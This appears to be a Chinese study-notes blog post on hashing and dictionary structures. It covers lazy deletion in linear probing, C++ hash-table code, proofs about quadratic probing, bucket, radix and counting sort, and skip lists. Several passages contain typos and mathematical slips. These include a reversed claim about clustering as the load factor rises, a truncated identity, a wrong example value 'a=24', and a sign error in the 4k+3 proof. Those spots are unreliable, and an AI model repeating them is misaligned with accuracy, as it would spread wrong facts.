<p>在散列表内部解决冲突，无需附加的指针(指针、链表或溢出区等)空间，结构本身保持简洁。只要还有空桶，迟早会找到。但是已发生过(并已排解)的冲突，将会导致本不必发生的冲突。</p>
<p><strong>懒惰删除</strong></p>
<p>查找链中任何一环的确是，都会导致后续词条因无法抵达而缺失，表现为有时无法找到实际已存在的词条。所以采用闭散列时，执行删除操作需要特别调整。</p>
<p>为了保证查找链的完整，可将后继词条悉数取出，再重新插入，但如此将导致删除操作的复杂度增加。简明有效的方法是，为每个桶另设一个标志位，指示该桶尽管目前为空，但此前的确曾存放过词条。该桶虽不存放任何实质的词条，但仍是查找链中的一环。如此标记后，对后继词条的查找仍可照常进行，而不致中断。</p>
<p>带有删除标记的桶扮演的角色，因具体的操作而异。</p>
<ul>
<li>在删除等操作之前对某一目标词条的查找，在查找过程中，只有在当前桶单元为空，且不带懒惰删除标记时方可报告查找失败，否则，无论该桶非空，或带有懒惰删除标记，都将沿着查找链继续试探。</li>
<li>在插入等操作之前对某一目标词条的查找，无论当前桶为空，还是带有懒惰删除标记，均可报告查找成功，否则都将继续沿着查找链继续试探。</li>
</ul>
<p>懒惰标记的操作借助位图实现，具体操作如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bitmap* lazyRemoval; &#x2F;&#x2F;懒惰删除标记</span><br><span class="line">#define lazilyRemoved(x)  (lazyRemoval-&gt;test(x))</span><br><span class="line">#define markAsRemoved(x)  (lazyRemoval-&gt;set(x))</span><br></pre></td></tr></table></figure>
<p>考虑如下调整：</p>
<ul>
<li>每次查找成功后，将命中词条前移至查找链中第一个带有懒惰删除标记的空桶(若的确命中存在且位于空桶之前)</li>
<li>每次查找失败后，若查找链的某一后缀完全由带懒惰删除标记的空桶组成，则清除它们的标记</li>
</ul>
<p>但是以上调整并不可行，为了删除带有懒惰删除标记的桶，实质上等效于压缩查找链。但是<strong>查找链可能彼此有所重叠，任何一个带有懒惰删除标记的桶，都可能同时属于多个查找链</strong>。所以其中一条查找链的压缩，都将可能导致其他查找链的断裂。因此为了使这些策略可行，还必须做更多的处理，通常都未免弄巧成拙，得不偿失。</p>
<p><strong>查找</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; V* Hashtable&lt;K, V&gt;::get ( K k ) <span class="comment">//散列表词条查找算法</span></span><br><span class="line">&#123;  <span class="keyword">int</span> r = probe4Hit ( k ); <span class="keyword">return</span> ht[r] ? &amp; ( ht[r]-&gt;value ) : <span class="literal">NULL</span>;  &#125; <span class="comment">//禁止词条的key值雷同</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">int</span> Hashtable&lt;K, V&gt;::probe4Free ( <span class="keyword">const</span> K&amp; k ) &#123;</span><br><span class="line">   <span class="keyword">int</span> r = hashCode ( k ) % M; <span class="comment">//从起始桶（按除余法确定）出发</span></span><br><span class="line">   <span class="keyword">while</span> ( ht[r] ) r = ( r + <span class="number">1</span> ) % M; <span class="comment">//沿查找链逐桶试探，直到首个空桶（无论是否带有懒惰删除标记）</span></span><br><span class="line">   <span class="keyword">return</span> r; <span class="comment">//为保证空桶总能找到，装填因子及散列表长需要合理设置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先采用除余法确定首个试探的桶单元，然后按线性试探法沿查找链逐桶试探。统一返回最后查找被试探的桶的秩，上层调用者只需核对该桶是否为空，即可判断是否查找失败。</p>
<p><strong>删除</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">bool</span> Hashtable&lt;K, V&gt;::remove ( K k ) &#123; <span class="comment">//散列表词条删除算法</span></span><br><span class="line">   <span class="keyword">int</span> r = probe4Hit ( k ); <span class="keyword">if</span> ( !ht[r] ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//对应词条不存在时，无法删除</span></span><br><span class="line">   release ( ht[r] ); ht[r] = <span class="literal">NULL</span>; markAsRemoved ( r ); N--; <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   <span class="comment">//否则释放桶中词条，设置懒惰删除标记，并更新词条总数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">int</span> Hashtable&lt;K, V&gt;::probe4Hit ( <span class="keyword">const</span> K&amp; k ) &#123;</span><br><span class="line">   <span class="keyword">int</span> r = hashCode ( k ) % M; <span class="comment">//从起始桶（按除余法确定）出发</span></span><br><span class="line">   <span class="keyword">while</span> ( ( ht[r] &amp;&amp; ( k != ht[r]-&gt;key ) ) || ( !ht[r] &amp;&amp; lazilyRemoved ( r ) ) )</span><br><span class="line">      r = ( r + <span class="number">1</span> ) % M; <span class="comment">//沿查找链线性试探：跳过所有冲突的桶，以及带懒惰删除标记的桶</span></span><br><span class="line">   <span class="keyword">return</span> r; <span class="comment">//调用者根据ht[r]是否为空，即可判断查找是否成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先调用<code>probe4Hit(k)</code>算法，沿关键码k对应的查找链顺序查找。若在某桶单元命中，则释放其中的词条，为该桶单元设置懒惰删除标记，并更新词典的规模。</p>
<p><strong>插入</strong></p>
<p>调用<code>probe4Free(k)</code>算法，若沿关键码k所属查找链可找到一空桶，则在其中创建对应的词条，并更新词典的规模。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">bool</span> Hashtable&lt;K, V&gt;::put ( K k, V v ) &#123; <span class="comment">//散列表词条插入</span></span><br><span class="line">   <span class="keyword">if</span> ( ht[probe4Hit ( k ) ] ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//雷同元素不必重复插入</span></span><br><span class="line">   <span class="keyword">int</span> r = probe4Free ( k ); <span class="comment">//为新词条找个空桶（只要装填因子控制得当，必然成功）</span></span><br><span class="line">   ht[r] = <span class="keyword">new</span> Entry&lt;K, V&gt; ( k, v ); ++N; <span class="comment">//插入（注意：懒惰删除标记无需复位）</span></span><br><span class="line">   <span class="keyword">if</span> ( N * <span class="number">2</span> &gt; M ) rehash(); <span class="comment">//装填因子高于50%后重散列</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">int</span> Hashtable&lt;K, V&gt;::probe4Free ( <span class="keyword">const</span> K&amp; k ) &#123;</span><br><span class="line">   <span class="keyword">int</span> r = hashCode ( k ) % M; <span class="comment">//从起始桶（按除余法确定）出发</span></span><br><span class="line">   <span class="keyword">while</span> ( ht[r] ) r = ( r + <span class="number">1</span> ) % M; <span class="comment">//沿查找链逐桶试探，直到首个空桶（无论是否带有懒惰删除标记）</span></span><br><span class="line">   <span class="keyword">return</span> r; <span class="comment">//为保证空桶总能找到，装填因子及散列表长需要合理设置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>装填因子$\lambda =N/M$是最为重要的因素。随着$\lambda$上升，词条在散列表中聚集的程度必将持续减少，这也势必加剧查找成本的进一步攀升。若将装填因子控制在适当范围内，闭散列的平均效率通常可保持在较为理想的水平。一般建议是$\lambda &lt;0.5$。</p>
<p><strong>重散列</strong></p>
<p>将装填因子控制在一定范围内，重散列即是常用的一种方法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">void</span> Hashtable&lt;K, V&gt;::rehash() &#123;</span><br><span class="line">   <span class="keyword">int</span> old_capacity = M; Entry&lt;K, V&gt;** old_ht = ht;</span><br><span class="line">   M = primeNLT ( <span class="number">2</span> * M, <span class="number">1048576</span>, <span class="string">&quot;../../_input/prime-1048576-bitmap.txt&quot;</span> ); <span class="comment">//容量至少加倍</span></span><br><span class="line">   N = <span class="number">0</span>; ht = <span class="keyword">new</span> Entry&lt;K, V&gt;*[M]; <span class="built_in">memset</span> ( ht, <span class="number">0</span>, <span class="keyword">sizeof</span> ( Entry&lt;K, V&gt;* ) * M ); <span class="comment">//新桶数组</span></span><br><span class="line">   release ( lazyRemoval ); lazyRemoval = <span class="keyword">new</span> Bitmap ( M ); <span class="comment">//新开懒惰删除标记比特图</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; old_capacity; i++ ) <span class="comment">//扫描原桶数组</span></span><br><span class="line">      <span class="keyword">if</span> ( old_ht[i] ) <span class="comment">//将非空桶中的词条逐一</span></span><br><span class="line">         put ( old_ht[i]-&gt;key, old_ht[i]-&gt;value ); <span class="comment">//插入至新的桶数组</span></span><br><span class="line">   release ( old_ht ); <span class="comment">//释放原桶数组——由于其中原先存放的词条均已转移，故只需释放桶数组本身</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重散列算法：装填因子过大时，采取“逐一取出再插入”的朴素策略，对桶数组扩容</p>
<p>不可简单地（通过memcpy()）将原桶数组复制到新桶数组（比如前端），否则存在两个问题：</p>
<ul>
<li>会继承原有冲突</li>
<li>可能导致查找链在后端断裂，即便为所有扩充桶设置懒惰删除标志也无济于事</li>
</ul>
<h2 id="平方试探法"><a href="#平方试探法" class="headerlink" title="平方试探法"></a>平方试探法</h2><p><strong>单向平方试探</strong></p>
<p>线性试探法各查找链均由物理地址连续的桶单元组成，因而会加剧关键码的聚集趋势，查找操作的效率将有所降低。平凡试探法可有效缓解聚集现象，在试探过程中，按如下规则确定第j次试探的桶地址：</p>
<p>$(hash(key)+j^2)%M,j=0,1,2,…$</p>
<p>各次试探的位置到起始位置的距离以平方速率增长。</p>
<p><strong>局部性</strong></p>
<p>平凡试探法之所以可以有效地缓解聚集现象，是因为充分利用了平方函数的特点，顺着查找链，试探位置的间距将以线性的速度增长。同时，常规的I/O操作页面规模已足够大，只有在查找链极长时，才有可能引发额外的I/O操作。</p>
<blockquote>
<p>设散列表长度取作素数$M&gt;2$,试证明：任一关键码所对应的的查找链中，前$\lceil M/2 \rceil=(M+1)/2$个桶必然互异</p>
</blockquote>
<p>反证，假设存在$0 \leq a &lt; \lceil M/2 \rceil$,使查找链上的第$a$个位置与第$b$个位置冲突，于是$a^2$和$b^2$必然同属于关于$M$的同一同余类，亦即：</p>
<p>$a^2 \equiv b^2(mod M)$</p>
<p>于是$a^2-b^2=(a+b)(a-b) \equiv 0(mod M)$</p>
<p>无论是$(a+b)$还是$(a-b)$绝对值都严格小于M,故均不可能被M整除，这与M为素数的条件矛盾。</p>
<p>查找链的前$\lceil M/2 \rceil$项关于$M$必然属于不同的同余类，因此互不冲突。在装填因子不足50%时，$\lceil M/2 \rceil$ 至少有一个是空余的，因此不可能发生无法抵达空桶的情况。</p>
<p>M若为合数，$n^2%M$可能的取值必然少于$\lceil M/2 \rceil$种，M若为素数，$n^2%M$可能的取值恰好等于$\lceil M/2 \rceil$种，恰由查找链的前$\lceil M/2 \rceil$项取遍。</p>
<blockquote>
<p>在装填因子超过50%时，只要适当调整各桶的位置，下一插入操作必然因无法达到空桶而失败</p>
</blockquote>
<p>任取：$\lceil M/2 \rceil \leq c&lt;M-1$,考查查找链上的第$c$项</p>
<p>总是存在$0 \leq d &lt;\lceil m/2 \rceil $,查找链上第$d$项与该第$c$项冲突</p>
<p>实际上，只要令$d=M-c \neq c$</p>
<p>则有：$c^2-d^2=(c+d)(c-d)=M(c-d) \equiv 0(mod M)$</p>
<p>于是$c^2$和$d^2$同属一个同余类，作为散列地址相互冲突。</p>
<blockquote>
<p>散列表长度$M$为合数时，即便装填因子低于50%,平方试探仍有可能无法终止</p>
</blockquote>
<p>考查$M=12$的散列表，{$0^2$,$1^2$,$2^2$,$3^2$,$4^2$,…}关于$M$模余只有${0,1,4,9}$四种可能。于是，即便只有这四个位置为空，也会因为查找链的重合循环导致新的关键码0无法插入。但是此时的装填因子仅为$\lambda=4/12&lt;50%$</p>
<p>此时，对于秩$0 \leq a&lt;b&lt;\lceil M/2\rceil$,即便</p>
<p>$a+b \equiv 0 (mod M)$</p>
<p>$a-b \equiv 0(mod M)$</p>
<p>均不成立，也依然可能有:</p>
<p>$a^2-b^2=(a+b)(a-b) \equiv 0 (modM)$</p>
<p>以以上例子为例，$M=12$的散列表，取$a=24$和$b=4$,则</p>
<p>$2+4=6 \equiv 0(mod 12)$</p>
<p>$2-4=-2 \equiv 0(mod 12)$</p>
<p>均不成立，然而依然有$2^2-4^2=-12\equiv 0(mod 12)$</p>
<p><strong>双向平方试探</strong></p>
<p>自冲突位置起，将以{$+1^2$,$-1^2$,$+2^2$,$-2^2$,$+3^2$,$-3^2$,…}为间距依次试探。整个试探过程中，跳转的方向前后交替，所以称为双向平方试探。</p>
<blockquote>
<p>只要散列表取作$4k+3$($k$为非负整数)，则任一关键码所对应的查找链中，前$M$个桶必然互异</p>
</blockquote>
<p>根据跳转的方向，查找链的前$M$项可分为三类：</p>
<ul>
<li>O:第1次试探，位于原地的起点</li>
<li>A:第$2、4、6、…,M-1$次试探，相对于起点向前跳转</li>
<li>B:第$3、5、7、….M$次试探，相对于起点向后跳转</li>
</ul>
<p>根据此前的结论,$O \cup A$和$O \cup B$内部的试探不至相互冲突。因此，只需考虑A类试探和B类试探之间是否会存在冲突。</p>
<p>假设第$2a$次试探和第$2b+1$次试探相互冲突，于是便有：</p>
<p>$a^2 \equiv b^2(mod M)$</p>
<p>亦即$n=a^2+b^2\equiv 0(mod M) $</p>
<p>对于形如$M=4k+3$的素数表长，这是不可能的</p>
<p>一个自然数$n$若可表示为一对整数的平方和，则称之为可平方拆分的。</p>
<p>不妨设n的素因子分解式为：</p>
<p>$n=p_1^{\alpha1}p_2^{\alpha2}p_3^{\alpha3}…p_d^{\alpha d}$</p>
<p>以下恒等式：</p>
<p>$(u^2+v^2)(s^2+t^2)=(us+vt)^2$</p>
<p>$n$是可平方拆分的当且仅当对每个$1\leq d \leq d$，或$\alpha i$为偶数，或$p_i$是可平方拆分的。</p>
<p>除了$2=1^2+1^2$,其余素数可以根据关于4的模余值划分为两个同余类。根据费马平方和定理，形如$4k+1$的素因子必可以平方拆分，而形如$4k+3$的素因子必然不可平方拆分。因此，若$n$可平方拆分，则对于其中每一个形如$p_i=4k+3$的素因子，$\alpha i$必然是偶数。</p>
<p>由以上式子得，$M=4k+3$应是$4k+3$的一个素因子。根据分析可知，n必然可以被$M^2$整除，于是便有：</p>
<p>$n=a^2+b^2 \geq M^2$</p>
<p>然而，对于取值在$[1,\lfloor M/2 \rfloor]$ 范围内的$a$和$b$，这是不可能的。</p>
<h1 id="散列应用"><a href="#散列应用" class="headerlink" title="散列应用"></a>散列应用</h1><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p><strong>简单情况</strong></p>
<p>考查如下问题：给定$[0,M)$内的$n$个互异整数，如何高效地进行排序？</p>
<p>借助散列表$E[0,M)$</p>
<ul>
<li>创建散列表并将散列表初始化为0</li>
<li>使用最简单的散列函数$hash(key)=key4,将整数视为关键码逐一插入到散列表中</li>
<li>顺序遍历一趟散列表，依次输出非空桶中存放的关键码</li>
</ul>
<p>散列表的创建初始化耗时$O(M)$,将所有关键码插入散列表耗时$O( n )$ ，依次读出非空桶中的关键码$O(M)$，总体运行时间为$O(n+M)$。</p>
<p><strong>一般情况</strong></p>
<p>允许关键码重复，又该如何高效排序？</p>
<p>沿用以上构思，只不过这次需要处理散列冲突。不妨采用独立链法解决冲突，将所有整数作为关键码插入散列表后，只需一趟顺序遍历即可得到完整的排序结果，在串联时留意链表方向，甚至可以确保排序结果的稳定，如此实现的桶排序算法属于稳定算法。</p>
<p>散列表的创建初始化耗时$O(M)$,将所有关键码插入散列表耗时$O( n )$ ，依次读出非空桶中的关键码$O(M)$，总体运行时间为$O(n+M)$。在n&gt;&gt;M的场合，桶排序的时间将是:</p>
<p>$O(n+M)=O(max(n,M))=O(n)$</p>
<p>线性正比于待排序元素的数目，突破了$\Omega(nlogn)$的下界。在关键码均匀分布时，亦是如此。</p>
<p>基于散列表的排序算法采取的是循秩访问的方式，摒弃了以往基于关键码大小比较式的设计思路，所以不受下界约束。</p>
<p><strong>最大间隙</strong></p>
<p>任意$n$个互异点均将实轴分为$n-1$段有界区间，其中哪一段最长？</p>
<p><strong>平凡算法</strong></p>
<ul>
<li><p>将各点按照坐标排序(最坏情况下$\Omega(n logn)$)</p>
</li>
<li><p>依次计算相邻点对之间的距离，保留最大者$\Theta (n)$</p>
</li>
</ul>
<p><strong>线性算法</strong></p>
<ul>
<li>一趟线性扫描找到最左点、最右点</li>
<li>将有效范围划分为$n-1$段($n$个桶)</li>
<li>通过散列将各点归入对应的桶</li>
<li>在各桶中，动态记录最左点和最右点</li>
<li>算出相邻(非空桶之间的距离)</li>
<li>最大距离则为最大间隙</li>
</ul>
<p><strong>正确性</strong></p>
<p>$n-1$个间隙中的最宽者，绝不可能窄于这些间隙的平均宽度，即各个桶单元对应的区间宽度。最大间隙的两个端点绝不可能落在同一桶单元内。必然来自两个非空桶，中间可能有若干非空桶。左端点应在前一桶中应该最靠右，而又端点在后一桶中应该最靠左，因此只需动态记录各桶的最左点和最右点。</p>
<p><strong>复杂度</strong></p>
<p>时间复杂度为$O(n)$，空间复杂度为维护散列表所需空间，$O(n)$辅助空间。</p>
<p>对于最小间隙的问题，则不可使用以上方法，因为上述方法可用基于<strong>最大间隙至少与相邻的两个桶相交</strong>的事实，而最小间隙既有可能与两个相邻的非空桶相交，也有可能只与其中一个桶相交。</p>
<h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><p>实际应用场景中词条的关键码，未必都是整数。比如，一种常见情形是，关键码由多个字段组成，并采用所谓的字典序确定大小次序：<strong>任意两个关键码的大小关系取决于它们第一个互异的字段</strong>。</p>
<p>假定关键码由$t$个字段{$k_t$,$k_{t-1}$,$k_{t-2}$,…,$k_1$}组成，其中$k_t$优先级最高。只需按照优先级递增的顺序对每一字段做一趟桶排序，即可实现按整个关键码字典序的排序。这一算法称作基数排序，采用了低位字段优先的策略，其中所做桶排序的趟数，取决于组成关键码的字段数。</p>
<p><strong>正确性与稳定性</strong></p>
<p>以以下命题作为归纳假设：在经过基数排序的前i趟桶排序后，所有词条均已按照关键码最低的i个字段有序排列。</p>
<p>假定前$i-1$趟均成立，考查第i趟桶排序的情况</p>
<ul>
<li>凡第$i$位不同的词条：即便此前为逆序，现在亦必已转为有序</li>
<li>凡第$i$位相同的词条，得益于桶排序的稳定性，必保持原有次序</li>
</ul>
<p>如此实现的基数排序同样稳定。</p>
<p><strong>复杂度</strong></p>
<p>根据以上基数排序的流程，总体运行时间等于其中各趟桶排序所需时间的总和。</p>
<p>设各字段取值范围为$[0,m_i),1 \leq i \leq t $</p>
<p>$M=max{m_1,m_2,…,m_t}$</p>
<p>总体运行时间不超过:</p>
<p>$O(n+m_1)+O(n+m_2)+…O(n+m_t)=O(t(n+M))$</p>
<p>当$M=O(n)$且$t$为常数时，$O(n)$。</p>
<p>在一些特定场合，基数排序非常高效。例如，任给来自$[0,n^d)$范围内的$n$个整数，其中常数d&gt;1，可在$O(n)$时间内完成对它们的排序。</p>
<ul>
<li>在$O(dn)=O(n)$时间内，将这些整数转换为$n$进制的表示。</li>
<li>将每一位视作一个域，则这些整数的排序依据等效于按照这些域的字典序，直接套用基数排序即可完成排序</li>
</ul>
<p>以上基数排序过程包含$d$趟桶排序，累计耗时：</p>
<p>$dO(n)=O(dn)=O(n)$</p>
<p>原因：</p>
<ol>
<li>整数的取值范围有限制</li>
<li>不再是基于比较的计算模式</li>
</ol>
<h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><p>若将任一有序序列等效地视作有序向量，则每个元素的秩，应恰好等于序列中不大于该元素的元素总数。例如，其中最小元素的秩为$0$，最大元素的秩为$n-14$，分别有$0$和$n-1$个元素不大于它们。根据这一原理，只需统计出各元素的对应这一指标，也就确定了它们在有序向量中各自对应的秩。</p>
<p>无需借助冲突的独立链表，由此可得计数排序算法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">int* countingsort(int A[0,n))</span><br><span class="line">   引入一个可计数的散列表H[<span class="number">0</span>,M),其长度等于输入元素取值范围的宽度M</span><br><span class="line">   将H[]中所有桶的数值初始化为<span class="number">0</span></span><br><span class="line">   遍历序列A[<span class="number">0</span>,n) <span class="comment">//遍历计数，O(n)</span></span><br><span class="line">     对于每一项，令H[A[k]]++</span><br><span class="line">   遍历散列表H[<span class="number">0</span>,M)</span><br><span class="line">     对于每一项H[i],令H[i+<span class="number">1</span>]+=H[i]</span><br><span class="line">   创建序列S[<span class="number">0</span>,n)，记录排序结果</span><br><span class="line">   逆向遍历输入序列A[<span class="number">0</span>,n)</span><br><span class="line">     对于每一项A[k]</span><br><span class="line">     令S[--H[A[k]]]=A[k]</span><br><span class="line">   返回s[<span class="number">0</span>,n)</span><br></pre></td></tr></table></figure>
<p>注意，最后一步扫描不可从前到后，否则稳定性不再满足。</p>
<p>其中各个步骤所需的时间，总体而言不超过$O(n+M)$ 。若$n&gt;&gt;m$，则排序时间为$O(n)$。这就是所谓的小集合大数据的情况，在当下已经成为数据和信息处理的主流类型。</p>
<h1 id="跳转表"><a href="#跳转表" class="headerlink" title="跳转表"></a>跳转表</h1><p>可否综合向量与列表的优势，高效地实现词典接口？具体地，如何使得各接口的效率为$O(logn)$。</p>
<p><img src="https://i.loli.net/2019/09/08/V9cLzn6BCqXRgGK.png"></p>
<p>跳转表的宏观逻辑如图所示，其内部由沿纵向分层，横向相互耦合的多个列表{$S_0$,$S_1$,$S_2$,…,$S_h$}组成，$h$称为跳转表的高度。每一水平列表称作一层，其中$S_0$和$S_h$分别称作底层和顶层。同层节点之间可定义前驱和后继关系。为便于查找，同层节点都按关键码排序。层次不同的节点可能沿着纵向组成塔，同一塔内的节点以高度为序定义前驱和后继。塔与词典中的词条一一对应。</p>
<p>高层列表总是底层列表的子集，其中特别地，$S_0$包含词典中所有词条，而$S_h$除头、尾哨兵外不含任何实质地词条。跳转表的层高$h$必然决定于最大的塔高。</p>
<p>跳转表各塔高度的随机分布规律对跳转表的整体性能至关重要。控制跳转表的生长过程，在时间和空间上都可实现足够高的效率。此类控制策略必然满足所谓生长概率减半的条件：</p>
<p>对于任意的$0 \leq k&lt;h$,$S_k$中任一节点在$S_{k+1}$中仍然出现的概率，始终为1/2。</p>
<p>可见，各塔高度符合集合分布：$Pr(h=k)=p^{k-1}(1-p)$</p>
<p>于是，期望的塔高为$E(h)=1/(1-p)=2$</p>
<p>也可以如此解释，$S_0$中任一关键码在$S_k$中依然出现的概率均为$2^{-k}$,第$k$层节点数的期望值$E(|S_k|)=n2^{-k}=n/2^k$。</p>
<p>于是，所有节点期望的总数(即各层列表所需空间总和)为</p>
<p>$E(\sum_k|S_k|)=\sum_kE(|S_k|)=n\sum_k2^{-k}&lt;2n=O(n)$</p>
<p>跳转表所需空间期望值为$ O( n )$</p>
<h2 id="初始化与构造"><a href="#初始化与构造" class="headerlink" title="初始化与构造"></a>初始化与构造</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> Quadlist&lt;T&gt;::init() &#123; <span class="comment">//Quadlist初始化，创建Quadlist对象时统一调用</span></span><br><span class="line">   header = <span class="keyword">new</span> QuadlistNode&lt;T&gt;; <span class="comment">//创建头哨兵节点</span></span><br><span class="line">   trailer = <span class="keyword">new</span> QuadlistNode&lt;T&gt;; <span class="comment">//创建尾哨兵节点</span></span><br><span class="line">   header-&gt;succ = trailer; header-&gt;pred = <span class="literal">NULL</span>; <span class="comment">//沿横向联接哨兵</span></span><br><span class="line">   trailer-&gt;pred = header; trailer-&gt;succ = <span class="literal">NULL</span>; <span class="comment">//沿横向联接哨兵</span></span><br><span class="line">   header-&gt;above = trailer-&gt;above = <span class="literal">NULL</span>; <span class="comment">//纵向的后继置空</span></span><br><span class="line">   header-&gt;below = trailer-&gt;below = <span class="literal">NULL</span>; <span class="comment">//纵向的前驱置空</span></span><br><span class="line">   _size = <span class="number">0</span>; <span class="comment">//记录规模</span></span><br><span class="line">&#125; <span class="comment">//如此构造的四联表，不含任何实质的节点，且暂时与其它四联表相互独立</span></span><br></pre></td></tr></table></figure>
<p>每个词条都在所属的塔内同时存在多个副本，浪费了大量的空间。只需将所有词条组织为一个独立的横向列表，则各词条所对应的纵向列表即可不必重复保留词条的副本。纵向列表中的每个节点，只需通过引用指向横向列表中对应的词条。如此，一旦查找终止于某纵向列表，即可直接通过引用找到对应的词条。</p>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; V* Skiplist&lt;K, V&gt;::get ( K k ) &#123; <span class="comment">//跳转表词条查找算法</span></span><br><span class="line">   <span class="keyword">if</span> ( empty() ) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">   ListNode&lt;Quadlist&lt;Entry&lt;K, V&gt;&gt;*&gt;* qlist = first(); <span class="comment">//从顶层Quadlist的</span></span><br><span class="line">   QuadlistNode&lt;Entry&lt;K, V&gt;&gt;* p = qlist-&gt;data-&gt;first(); <span class="comment">//首节点开始</span></span><br><span class="line">   <span class="keyword">return</span> skipSearch ( qlist, p, k ) ? &amp; ( p-&gt;entry.value ) : <span class="literal">NULL</span>; <span class="comment">//查找并报告</span></span><br><span class="line">&#125; <span class="comment">//有多个命中时靠后者优先</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">bool</span> Skiplist&lt;K, V&gt;::skipSearch (</span><br><span class="line">   ListNode&lt;Quadlist&lt;Entry&lt;K, V&gt;&gt;*&gt;* &amp;qlist, <span class="comment">//从指定层qlist的</span></span><br><span class="line">   QuadlistNode&lt;Entry&lt;K, V&gt;&gt;* &amp;p, <span class="comment">//首节点p出发</span></span><br><span class="line">   K&amp; k ) &#123; <span class="comment">//向右、向下查找目标关键码k</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> ) &#123; <span class="comment">//在每一层</span></span><br><span class="line">      <span class="keyword">while</span> ( p-&gt;succ &amp;&amp; ( p-&gt;entry.key &lt;= k ) ) <span class="comment">//从前向后查找</span></span><br><span class="line">         p = p-&gt;succ; <span class="comment">//直到出现更大的key或溢出至trailer</span></span><br><span class="line">      p = p-&gt;pred; <span class="comment">//此时倒回一步，即可判断是否</span></span><br><span class="line">      <span class="keyword">if</span> ( p-&gt;pred &amp;&amp; ( k == p-&gt;entry.key ) ) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//命中</span></span><br><span class="line">      qlist = qlist-&gt;succ; <span class="comment">//否则转入下一层</span></span><br><span class="line">      <span class="keyword">if</span> ( !qlist-&gt;succ ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//若已到穿透底层，则意味着失败</span></span><br><span class="line">      p = ( p-&gt;pred ) ? p-&gt;below : qlist-&gt;data-&gt;first(); <span class="comment">//否则转至当前塔的下一节点</span></span><br><span class="line">   &#125;  <span class="comment">//课后：通过实验统计，验证关于平均查找长度的结论</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的参数<code>p</code>和<code>qlist</code>分别指示命中关键码所属塔的顶部节点及其所属的列表。<code>qlist</code>和<code>p</code>的初始值分别为顶层列表及其首节点，返回后将为上层的查找节点提供必要的信息。</p>
<p><strong>时间复杂度</strong></p>
<p>考查第$k$层列表$S_k$,</p>
<p>$S_k$非空，当且仅当$S_0$所含的$n$个节点中,至少有一个会出现在$S_k$中，相应的概率为</p>
<p>$Pr(|S_k|&gt;0) \leq n2^{-k}=n/2^k$</p>
<p>反过来，$S_k$ 为空的概率为</p>
<p>$Pr(|S_k|&gt;0) \geq 1-n2^{-k}$</p>
<p>这一概率随着高度$k$的增加将迅速上升并接近100%。</p>
<p>以$k=3logn$层为例，该层列表为空，当且仅当$h&lt;k$,对应的概率为</p>
<p>$Pr(h&lt;k)=Pr(|S_k|=0)\geq 1-n/2^k=1-n/n^3=1-1/n^2$</p>
<p>一般地，$k=alogn$层列表为空的概率为$1-1/n^{a-1}$,$a&gt;3$后这一概率将迅速地接近100%。</p>
<p>$h$的期望值$S(h)=O(logn)$</p>
<p>查找的过程中，每次跳转只能向右或向下，故活跃节点的高度必单调非增，每个高度上纵向跳转至多一次。因此，整个查找过程中消耗于纵向跳转的时间不超过跳转表高度的期望值$O(logn)$。</p>
<p>沿同一列表的横向跳转所经过的节点必然依次紧邻，且均为各自所属塔的塔顶。若将同层连续横向跳转的次数记作$Y$,跳转经过$k$个塔顶，一个非塔顶则有几何分布：</p>
<p>$Pr(Y=k)=(1-p)^kp$</p>
<p>$E(Y)=(1-p)/p=(1-0.5)/0.5=1$</p>
<p>同层列表中紧邻的塔顶节点，平均不过$1+1=2$个。沿着每条查找路径，在每一高度上平均只做常数次横向跳转。因此，整个查找过程中所做的横向跳转的期望次数，线性正比于跳转表的期望高度，亦是$O( log n)$。</p>
